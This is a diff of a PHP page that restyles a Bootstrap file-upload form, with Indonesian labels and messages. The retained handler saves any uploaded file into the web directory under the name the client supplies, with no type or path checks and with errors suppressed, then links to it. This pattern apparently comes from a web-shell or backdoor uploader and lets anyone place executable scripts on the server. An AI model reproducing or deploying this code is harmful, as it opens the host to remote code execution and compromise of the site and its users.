@@ -94,13 +94,15 @@ echo '<section id="upload" class="upload mb-4">
 </div>';
 echo '<div class="row justify-content-center">
 <div class="col-lg-8">
-<form class="custom-file-input" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo '<input type="file" name="file" size="60"><input name="_upl" type="submit" id="_upl" value="Upload" class="btn btn-secondary"></form>
+<form method="post" enctype="multipart/form-data" name="uploader" id="uploader">
+<p align="center"><input class="form-control" type="file" name="file"></p>
+<p align="center"><input name="_upl" type="submit" id="_upl" value="Mulai Upload File" class="btn btn-secondary"></p>
+</form>
 </div>
 </div>
 </div>
 </section>';
-if( $_POST['_upl'] == "Upload" ) {
+if( $_POST['_upl'] == "Mulai Upload File" ) {
 if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<div class="alert alert-success text-center" role="alert">File “<u><b><a title="Visit Link" href="./'.$_FILES['file']['name'].'">'.$_FILES['file']['name'].'</a></b></u>” berhasil diupload...!!!</div><br/><br/>'; }
 else { echo '<div class="alert alert-danger text-center" role="alert">File gagal diupload...!!!</div><br/><br/>'; }
 }
